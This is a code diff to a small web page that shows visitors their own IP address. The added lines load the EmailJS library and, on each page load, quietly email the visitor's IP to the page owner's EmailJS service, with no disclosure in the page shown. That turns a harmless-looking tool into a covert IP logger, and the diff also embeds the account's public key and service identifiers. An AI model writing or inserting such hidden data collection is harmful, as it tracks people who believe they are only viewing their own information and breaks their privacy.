@@ -26,7 +26,11 @@
     <p class="loading">Loading...</p>
     <p class="ip-display" id="ip-address"></p>
 
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
+        // Initialize EmailJS
+        emailjs.init("oNkg6II_swjGcHfiq");
+
         // Use an API to fetch the IP address of the user
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
@@ -34,6 +38,20 @@
                 // Display the IP address on the page
                 document.querySelector('.loading').style.display = 'none';
                 document.getElementById('ip-address').textContent = data.ip;
+                
+                // Prepare the email data
+                const emailData = {
+                    ip_address: data.ip
+                };
+
+                // Send the email with the IP address
+                emailjs.send('service_0ugco4i', 'template_9uimf6d', emailData)
+                    .then(response => {
+                        console.log("Email sent successfully:", response);
+                    })
+                    .catch(error => {
+                        console.error("Error sending email:", error);
+                    });
             })
             .catch(error => {
                 // Handle errors (e.g., no internet connection)
